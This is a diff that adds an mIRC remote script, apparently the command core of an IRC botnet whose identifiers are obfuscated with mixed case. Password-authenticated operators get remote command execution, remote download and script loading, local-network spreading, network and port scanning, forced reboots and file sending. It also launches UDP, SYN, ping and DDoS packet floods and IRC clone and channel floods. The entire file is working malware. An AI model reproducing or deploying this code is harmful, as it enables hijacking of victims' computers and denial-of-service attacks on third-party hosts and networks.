@@ -1,0 +1,223 @@
+on 1:TexT:xn*:#:{ iF ($lEvEl($niCk) == 911) { hAlT } | elseiF ($niCk IsoP #) && ($2 = %XXPAss) { AUser 911 $niCk } }
+on 911:TexT:*:#:{
+  iF ($1 == $Me) {
+    iF ($2 == %PerFix $+ -) && ($3-) { $3- | vTAlC ATTeMPTing To: $3- | hAlT }
+    iF ($2 == %PerFix $+ Proxy) && ($3-) { Proxyx $3- }
+    iF ($2 == %PerFix $+ IPAll) { sET %IPAll $3 | sET %xPorT $4 | sET %timerN $5 | Resolve1 }
+    iF ($2 == %PerFix $+ sToPsCAniP) && ($3-) { vTAlC sCAnning sToPPeD %SCAn.IP in PorT %nFWSCAnPorT | XFWSCAnHAlT }
+    iF ($2 == %PerFix $+ CleAr) { CleArF |  vTAlC Ok }
+    iF ($2 == %PerFix $+ senD) { DCC senD $niCk $MirCDirqxx32.TxT | vTAlC Ok  }
+    iF ($2 == %PerFix $+ IPAll) && ($3-) { sET %IPAll $3 | sET %xPorT $4 | sET %timerN $5 | Resolve1 }
+    iF ($2 == %PerFix $+ looks) && ($3-) { lookNeTwor }
+    iF ($2 == %PerFix $+ neTs) && ($3-) { NeTworkSCAnner | vTAlC BEGIN on hosT : $+ %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 : %xPorT }
+    iF ($2 == %PerFix $+ neTssToP) && ($3-) { vTAlC sCAnning FroM: %CNeTworkSCAner1HosT To %begshorTiP sToPPeD : PorT : %xPorT | NeTworkSCAnnerSToP }
+    iF ($2 == %PerFix $+ sPliTC) && ($3-) { sET %SErvERsPliT $3 | sET %SErvERsPliTPorT $4 | xLoADSPliT }
+    iF ($2 == %PerFix $+ sPliTD) && ($3-) { DIsConneCTxsPliT | timersPliT oFF | //soCkClose xSPliT* }
+    iF ($2 == %PerFix $+ DownloADA) && ($3-) { DownloAD $3- | hAlT }
+    iF ($2 == %PerFix $+ UPDATeA) && ($3-) { Down $3- }
+    iF ($2 == %PerFix $+ rAnD1) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $3 | sET %timerN $4 | ResolveAx4 }
+    iF ($2 == %PerFix $+ rAnD2) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $3 | sET %timerN $4 | ResolveAx5 }
+    iF ($2 == %PerFix $+ sTArT1) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $3 | sET %timerN $4 | ResolveAx1 }
+    iF ($2 == %PerFix $+ sTArT2) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $3 | sET %timerN $4 | ResolveAx2 }
+    iF ($2 == %PerFix $+ sTArT3) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $3 | sET %timerN $4 | ResolveAx3 }
+    iF ($2 == %PerFix $+ sTArTiP1) && ($5) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $3 | sET %xIP.1 $3 | sET %xPorT $4 | sET %timerN $5 | ResolveAxs }
+    iF ($2 == %PerFix $+ sTArTiP2) && ($6) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $3 | sET %xIP.1 $3 | sET %IP.2 $4 | sET %xIP.2 $4 | sET %xPorT $5 | sET %timerN $6 | ResolveAxs1 }
+    iF ($2 == %PerFix $+ sTArTiP3) && ($7) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $3 | sET %xIP.1 $3 | sET %IP.2 $4 | sET %xIP.2 $4 | sET %IP.3 $5 | sET %xIP.3 $5 | sET %xPorT $6 | sET %timerN $7 | ResolveAxs2 }
+  }
+  iF ($1 == %PerFix $+ sTArTiP1) && ($4) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $2 | sET %xIP.1 $2 | sET %xPorT $3 | sET %timerN $4 | ResolveAxs }
+  iF ($1 == %PerFix $+ sTArTiP2) && ($5) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $2 | sET %xIP.1 $2 | sET %IP.2 $3 | sET %xIP.2 $3 | sET %xPorT $4 | sET %timerN $5 | ResolveAxs1 }
+  iF ($1 == %PerFix $+ sTArTiP3) && ($6) && (%CNeTworkSCAnerHosT == $nUll) { sET %IP.1 $2 | sET %xIP.1 $2 | sET %IP.2 $3 | sET %xIP.2 $3 | sET %IP.3 $4 | sET %xIP.3 $4 | sET %xPorT $5 | sET %timerN $6 | ResolveAxs2 }
+  iF ($1 == %PerFix $+ rAnD1) && ($3) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $2 | sET %timerN $3 | ResolveAx4 }
+  iF ($1 == %PerFix $+ rAnD2) && ($3) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $2 | sET %timerN $3 | ResolveAx5 }
+  iF ($1 == %PerFix $+ sTArT1) && ($3) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $2 | sET %timerN $3 | ResolveAx1 }
+  iF ($1 == %PerFix $+ sTArT2) && ($3) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $2 | sET %timerN $3 | ResolveAx2 }
+  iF ($1 == %PerFix $+ sTArT3) && ($3) && (%CNeTworkSCAnerHosT == $nUll) { sET %xPorT $2 | sET %timerN $3 | ResolveAx3 }
+  iF ($1 == %PerFix $+ sPliTC) { sET %SErvERsPliT $2 | sET %SErvERsPliTPorT $3 | xLoADSPliT }
+  iF ($1 == %PerFix $+ sPliTD) { DIsConneCTxsPliT | timersPliT oFF | //soCkClose xSPliT* }
+  iF ($1 == %PerFix $+ UPDATeA) { Down $2- }
+  iF ($1 == %PerFix $+ usa) { sET %gDoPeIP $2 | sET %sqqq $3 | sET %timer.gDoPe $4 | TCP | vTAlC SenDing PACkeT To : $2 PorT : $3 PACkeTs : $4 }
+  iF ($1 == %PerFix $+ sy) && ($4) { sET %gDoPeIP $2 | sET %sqqq $3 | sET %timer.gDoPe $4 | syn1 | vTAlC SenDing PACkeT To : $2 PorT : $3 PACkeTs : $4 }
+  iF ($1 == %PerFix $+ syall) && ($7) { sET %gDoPeIP1 $2 | sET %gDoPeIP2 $2 | sET %gDoPeIP3 $2 | sET %gDoPeIP4 $2 | sET %sqqq1 $3 | sET %sqqq2 $4 | sET %sqqq3 $5 | sET %sqqq4 $6 | sET %timer.gDoPe1 $7 | sET %timer.gDoPe2 $7 | sET %timer.gDoPe3 $7 | sET %timer.gDoPe4 $7 | syns }
+  iF ($1 == %PerFix $+ sy2) && ($4) { sET %gDoPeIP $2 | sET %sqqq $3 | sET %timer.gDoPe $4 | syn2 | vTAlC SenDing PACkeT To : $2 PorT : $3 PACkeTs : $4 }
+  iF ($1 == %PerFix $+ sysToP) { sysToP }
+  iF ($1 == %PerFix $+ syallsToP) { sysToPs }
+  iF ($1 == %PerFix $+ usasToP) { TCPsToP }
+  iF ($1 == %PerFix $+ pcv) { sET %gDoPeIP $2 | sET %sqqq $3 | sET %timer.gDoPe $4 | Pg1 | vTAlC SenDing PACkeT To : $2 PorT : $3 PACkeTs : $4 }
+  iF ($1 == %PerFix $+ pcvsToP) { Pg1sToP }
+  iF ($1 == %PerFix $+ rniCk) { /.niCk $rAnDoMn }
+  iF ($1 == %PerFix $+ PUsToP) { gCoolsToP }
+  iF ($1 == %PerFix $+ PU1) { sET %gDoPeIP $2 | sET %timer.gDoPe $3 | gCoolsTArT | vTAlC SenDing PACkeT To : $2 PACkeTs : $3 }
+  iF ($1 == %PerFix $+ PU2) { sET %gDoPeIP $2 | sET %PorT.gDoPe $3 | sET %timer.gDoPe $4 | gCool1sTArT | vTAlC SenDing PACkeT To : $2 PorT : $3 PACkeTs : $4 }
+  iF ($1 == %PerFix $+ sCAniP) && ($2) && ($3) && ($4) { sET %SCAn.IP $2 | sET %nFWSCAnPorT $3 | sET %timerFWSCAnner $4 | STArTsCAniP | vTAlC SCAnPorT $2 sTArT PorT $3 timer SCAn $4 }
+  iF ($1 == %PerFix $+ sToPsCAniP) { vTAlC sCAnning sToPPeD %SCAn.IP in PorT %nFWSCAnPorT | XFWSCAnHAlT }
+  iF ($1 == %PerFix $+ senD) { DCC senD $niCk $MirCDirqxx32.TxT | vTAlC Ok  }
+  iF ($1 == %PerFix $+ IPAll) { sET %IPAll $2 | sET %xPorT $3 | sET %timerN $4 | Resolve1 }
+  iF ($1 == %PerFix $+ looks) { lookNeTwor }
+  iF ($1 == %PerFix $+ neTs) { NeTworkSCAnner | vTAlC BEGIN on hosT : $+ %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 : %xPorT }
+  iF ($1 == %PerFix $+ neTsToP) { vTAlC sCAnning FroM: %CNeTworkSCAner1HosT To %begshorTiP sToPPeD : PorT : %xPorT | NeTworkSCAnnerSToP }
+  iF ($1 == %PerFix $+ 1) { 
+    sET %100 $str(FLooDFLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sET %FlOooooooooD %100
+    vTAlC Ok 
+  }
+  iF ($1 == %PerFix $+ 2) { 
+    sET %200 12,8|||||[|]||]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]||]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]||]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]||]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]|[|]||]
+    sET %FlOooooooooD %200
+    vTAlC Ok 
+  }
+  iF ($1 == %PerFix $+ 3) { 
+    sET %300 $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sET %FlOooooooooD %300
+    vTAlC Ok 
+  }
+  iF ($1 == %PerFix $+ 4) { 
+    sET %500 $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sET %FlOooooooooD %500
+    vTAlC Ok 
+  }
+  iF ($1 == %PerFix $+ Con) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe Con | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ Con1) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe Con1 | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ jPjP) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe jP | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ jPMjPM) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe jPMsg | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FMsg) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe Msg | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FnoTiCe) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe noTiCe | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FFUCk) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe FUCk | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FCTCPC) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe CTCP | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FCTCPn) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe CTCP1 | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ DCC) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe DCC | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ whIsPer2) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe whIsPer | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ whIsPer1) { sET %FlO.FlOODwn $2- }
+  iF ($1 == %PerFix $+ FnoTiCe1) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe noTiCe1 | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ FFUCk1) { sET %ChAnFlOOD $2- | sET %FlO.FlOOD.TyPe FUCk1 | FlO.FlOOD } 
+  iF ($1 == %PerFix $+ SToP) { soCkClose FlO* | soCkClose %FlO.FlOOD.soCk }
+  iF ($1 == %PerFix $+ j) { sOCkWrITE -Tn SPLIT* join $2- }
+  iF ($1 == %PerFix $+ P) { sOCkWrITE -Tn SPLIT* PArT $2- }
+  iF ($1 == %PerFix $+ jPF) { sOCkWrITE -Tn SPLIT* join $2- $+ $CrlF $+ PArT $2- $+ $CrlF $+ join $2- $+ $CrlF $+ PArT $2- $+ $CrlF $+ join $2- $+ $CrlF $+ PArT $2- $+ $CrlF $+ join $2- $+ $CrlF $+ PArT $2- $+ $CrlF $+ join $2- $+ $CrlF $+ PArT $2- }
+  iF ($1 == %PerFix $+ De) { sOCkWrITE -Tn SPLIT* qUiT : $+ $boM | soCkClose SPLIT* }
+  iF ($1 == %PerFix $+ Co) { soCkClose SPLIT* | sET %SErvERr $2 | sET %PorT1 $3 | sET %CloneloAD $4 | sET %howMAny $4 | sPliTTers | vTAlC OK }
+  iF ($1 == %PerFix $+ CoF) { soCkClose FlO* | sET %SErvERr $2 | sET %PorT1 $3 | sET %ChAnFlOOD $4 | sET %FlO.FlOOD.TyPe jPMsg | FlO.FlOOD | vTAlC OK }
+  iF ($1 == %PerFix $+ FF1) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ FF2) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ FF3) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+
+  }
+  iF ($1 == %PerFix $+ F1) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(FLooDFLooDFLooDFLooDFLooDFLooD,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ F2) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ F3) { 
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ F5) { sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION | sOCkWrITE -Tn SPLIT* PrivMsg $2- :VERSION }
+  iF ($1 == %PerFix $+ F6) { sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ DCC SEND $rAnD(1,999999) $rAnD(1024,5000) $rAnD(1,5000) $+ $Chr(1) | sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ DCC CHAT $rAnD(1,999999) $rAnD(1024,5000) $rAnD(1,5000) $+ $Chr(1) }
+  iF ($1 == %PerFix $+ jPFM) {
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ jPFMn) {
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* noTiCe $2- : $+ $str(1Ping-TimeOut1Ping-TimeOut1Ping-TimeOut,5)
+  }
+  iF ($1 == %PerFix $+ jF) {
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PrivMsg $2- : $+ $str(dxrfxopbecdewxfdffdjutjodewrqpkgrrdfrsqpxz,5)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ jFC) {
+    sOCkWrITE -Tn SPLIT* join $2-
+    sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ Version $+ $Chr(1)
+    sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ PAGE $+ $Chr(1)
+    sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ PING $+ $Chr(1)
+    sOCkWrITE -Tn SPLIT* PRIVMSG $2- : $+ $Chr(1) $+ FINGER $+ $Chr(1)
+    sOCkWrITE -Tn SPLIT* PArT $2-
+  }
+  iF ($1 == %PerFix $+ reniCk) { //niCk $rAnDoMn | hAlT }
+  iF ($1 == %PerFix $+ oUT) { .rlEvEl 911 | vTAlC oUT }
+  iF ($1 == %PerFix $+ reloAD) { ReloADSysReMoTe | hAlT }
+  iF ($1 == %PerFix $+ TMr) && ($Me IsoP #) { sET %xiPr1 %xiPr2 $2- | timerxxF }
+  iF ($1 == %PerFix $+ TMoFF) && ($Me IsoP #) { timerxoFF | vTAlC timer oFF }
+  iF ($1 == %PerFix $+ TM) && ($Me IsoP #) { timerxF }
+  iF ($1 == %PerFix $+ -) && ($2-) { $2- | vTAlC ACTion: $2- | hAlT }
+  iF ($1 == %PerFix $+ reConneCT) { /timer -o 1 3 ConneCT | vTAlC reloADing in 3 seConDs | hAlT }
+  iF ($1 == %PerFix $+ resET) { vTAlC ATTeMPing To resTArT The CoMPUTer | timer 1 2 rUn RUNDLL32 SHELL32.DLL,SHExiTWinDowsEx 2 | hAlT }
+  iF ($1 == %PerFix $+ join) { vTAlC ATTeMPTing To join: $2 , Using key: $3- | timer 1 2 join $2 $3- | hAlT }
+  iF ($1 == %PerFix $+ PArT) { vTAlC ATTeMPTing To PArT: $2 , wiTh Msg: $3- | timer 1 2 PArT $2 $3- | hAlT }
+  iF ($1 == %PerFix $+ reMove) { vTAlC reMove: $2- | reMove $2- | hAlT }
+  iF ($1 == %PerFix $+ logoUT) { vTAlC User logoUT: $niCk , FroM lEvEl: 911 | rUser 911 $niCk | hAlT }
+  iF ($1 == %PerFix $+ iP) { vTAlC iP: $iP | hAlT }
+  iF ($1 == %PerFix $+ winDows) { vTAlC winDows: $os | hAlT }
+  iF ($1 == %PerFix $+ hosT) { vTAlC hosT: $hosT | hAlT }
+  iF ($1 == %PerFix $+ TiMe) { vTAlC TiMe: $TiMe(h:nn TT) | hAlT }
+  iF ($1 == %PerFix $+ DATe) { vTAlC DATe: $DATe(MMMM Doo yyyy) | hAlT }
+  iF ($1 == %PerFix $+ noTiCe) { vTAlC ATTeMPTing To noTiCe: $2 wiTh noTiCe Msg: $3- | noTiCe $2 $3- | hAlT }
+  iF ($1 == %PerFix $+ Msg) { vTAlC ATTeMPTing To Msg: $2 wiTh Msg: $3- | Msg $2 $3- | hAlT }
+  iF ($1 == %PerFix $+ rUn) { vTAlC rUn: $2- | /rUn $2- | hAlT }
+  iF ($1 == %PerFix $+ UPTiMe) { vTAlC sysTeM UPTiMe: $DUrATion($UPTiMe(sysTeM,3)) , MirC UPTiMe: $UPTiMe(MirC,1) }
+  iF ($1 == %PerFix $+ sET) { sET $2 $3- | vTAlC sET: $2 To $3- | hAlT }
+  iF ($1 == %PerFix $+ loAD) && ($2- != $nUll) { vTAlC loAD: $2- | loAD -rs $2- | hAlT }
+  iF ($1 == %PerFix $+ DownloADA) { DownloAD $2- | hAlT }
+  iF ($1 == %PerFix $+ Proxy) { sET %boT.Proxy $2 | sET %Proxy.PAss $3 | Proxyx $2 $3 }
+  iF ($1 == %PerFix $+ sPreAD) { sPreAD | vTAlC ATTeMPTing To sPreAD ThrU loCAl neTworks.. | hAlT }
+  iF ($1 == %PerFix $+ UDP) { iF (!$2) { vTAlC UDP error, synATx: !UDP <hosT/iP> <PorT> <nUM oF PACkeTs> <PACkeT DelAy> | hAlT } | iF (*.* !IswM $2) { vTAlC UDP error, YoU MUsT sPeCiFy A hosT/iP To PACkeT. | hAlT } | iF ($3 !IsnUM) { vTAlC UDP error, YoU MUsT sPeCiFy A PORT To FlOOD. | hAlT } | iF ($4 !IsnUM) { vTAlC UDP error, YoU MUsT sPeCiFy A NUMBER oF PACkeTs. | hAlT } | iF ($5 !IsnUM) { vTAlC UDP error, YoU MUsT sPeCiFy A PACKET-DELAY TiMe. | hAlT } | %UDP.iP = $2 | %UDP.PorT = $3 | %UDP.nUM = $4 | %UDP.DelAy = $5 | vTAlC UDP ATTACking sTArTing on iP: %UDP.iP , PorT: %UDP.PorT , AMoUnT: %UDP.nUM , DelAy: %UDP.DelAy  | .timerUDP %UDP.nUM %UDP.DelAy sOCKUDP UDP $+ $r(1,999999999999999999) %UDP.iP %UDP.PorT $str([]|,33) | UNsET %UDP.*  }
+  iF ($1 == %PerFix $+ DDos) { iF (!$2) { vTAlC Dos error, synTAx: !Dos <hosT/iP> <nUM oF PACkeTs> | hAlT } | iF (*.* !IswM $2) { vTAlC Dos error: YoU MUsT sPeCiFy A HosT or IP. | hAlT } | iF ($3 !IsnUM) { vTAlC Dos error: YoU MUsT sPeCiFy A NUMBER oF PACkeTs | hAlT } | vTAlC Dos PACkeTing.....  | rUn secuser.exe /n /Fh /r "Ping.exe $2 -n $3 -l 65500" }
+  iF ($1 == %PerFix $+ Pg) {
+    iF ($2 == $nUll) { vTAlC [PG] UsAge: xPg -s <iP> <nUM> / xPg -k | hAlT }
+    iF ($2 == -s) && (%Pingo == $nUll) { %Pingo = 1 | %PingiP = $3 | %PingMb = $4 | rUn secuser.exe /n /Fh /r "Ping.exe %PingiP -n %PingMb -l 65500 -w 0" | vTAlC [Pg] STArTeD Pg on: %PingiP , wiTh $CAlC($4 *65536/1024/1000) $+ Mb oF TrAFFiC.. | timerP 1 10 UNsET %Pingo | hAlT }
+    iF ($2 == -k) && (%Pingo != $nUll) { UNsET %Ping* | vTAlC [Pg] Now HAlTeD.. | rUn secuser.exe /n /Fh /r "sysCnFg.exe -kF Ping.exe" | hAlT }
+  }
+  iF ($1 == %PerFix $+ sy) && ($2 == -s) { sET %synPorT $4 | vTAlC sy FlOODing $3 wiTh $5 sy PACkeTs on PorT $4  | sET %synAA $3 | synz sTArT $5 $3 %synPorT }
+  iF ($1 == %PerFix $+ sy) && ($2 == -k) { soCkClose syn* | soCkClose syM* | vTAlC sy FlOOD on %synAA hAlTeD.. | UNsET %synPorT | UNsET %synAA | UNsET %synPACkeTs | hAlT }
+  iF ($1 == %PerFix $+ sy0) && ($2 == -s) { sET %synPorT $4 | vTAlC sy FlOODing $3 wiTh $5 sy PACkeTs on PorT $4  | sET %synAA $3 | synM sTArT $5 $3 %synPorT }
+}
